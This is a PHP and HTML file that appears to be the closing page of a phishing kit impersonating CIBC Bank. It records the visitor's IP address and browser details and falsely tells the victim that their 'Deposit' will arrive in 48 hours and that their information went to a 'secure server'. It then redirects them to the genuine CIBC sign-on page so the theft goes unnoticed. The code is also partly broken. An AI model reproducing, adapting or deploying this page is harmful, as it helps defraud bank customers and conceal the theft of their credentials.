<?php


#______MR.Int(TN)_______#
error_reporting(0);
session_start();
include "css/login.css";


if(isset($_POST['Submit'])) {

#ip info
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);

#Country info

		header("Location: finsh.php?".$_SESSION['DIR_']);
		}


?>




<!doctype html>
<html>
<head>

<meta charset="utf-8">
	<title>My Account</title>
<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="css/card.css" rel="stylesheet">
<meta http-equiv="refresh" content="3; URL=https://www.cibconline.cibc.com/olbtxn/authentication/PreSignOn.cibc?locale=en_CA">


    <meta charset="UTF-8">
    <link rel="stylesheet" href="#">
    <link rel="stylesheet" href="#">
	
	
		
		
<style type="text/css">
    .check_box{
        background-image: url("css/onboarding_form.png");
        background-repeat: no-repeat;
        padding-left: 28px;
        line-height: 26px;
        display: inline-block;
        margin-bottom: 9px;
        cursor: pointer;
    }
    #checked{
        background-position: 0px -100px;
    }
    #inchecked{
        background-position: 0px 0px;
    }
.inp{
        width: 358px;
        height: 40px;
        padding-left: 12px;
        margin-bottom: 18px;
        border: 1px solid #B7B6B6;
        border-radius: 3px;
        font-size: 16px;
        text-transform: capitalize;
} 
 .card{
        display: inline-block;
        background-image: url("css/sprites_cc_global.png");
        background-repeat: no-repeat;
        background-position: 0px -406px;
        height: 30px;
        position: relative;
        left: 124px;
        bottom: -15px;
        width: 40px;
         }
    .date{
    display: inline-block;
    background-image: url("css/sprites_cc_global.png");
    background-repeat: no-repeat;
    background-position: 0px -434px;
    height: 28px;
    position: relative;
    left: -72px;
    bottom: -9px;
    width: 40px;
    }
.in{
        font-family: arial, Helvetica, sans-serif;
    font-size: 10pt;
    color: #333;
    font-weight: normal;
    padding-top: 12px;
    padding-bottom: 12px;
    border-radius: 4px;
    border: 1px solid #CCC;
    margin: 5px;
    float: center;
}
  </style>
  
</head>

<body>

<div id="wb_Form1" style="position:absolute;left:475px; background-color: #FFF; border-radius: 10px; top:121px;width:457px;height:409px;z-index:0;">

<form name="Form1" method="POST"  enctype="text/plain" id="Form1">

<br>
     
		
	
			
			<center>
			<br><br><br>
				<font size="6"><h3>Congratulations !</h3></font>
				<font size="4"><p>Your Deposit would appear in your account after 48 hours.
all information had been sent in encrypted form to our secure server. Thank you for using CIBC Bank </p> </font><br> <br>
			
		<img src="images/0.gif" style="position:absolute;left:192px;top:275px;width:85px;height:85px;z-index:1;" alt="">
			
    </form>
		<bR><br><br>	
		</center>

			
      
   <input type="checkbox" hidden="hidden" id="checkbox" name="vbv_ready">
   <DIV ALIGN="center">
							<br><br>
							
						</DIV>
				</center>			
   </form>
   
   
</body>
</html>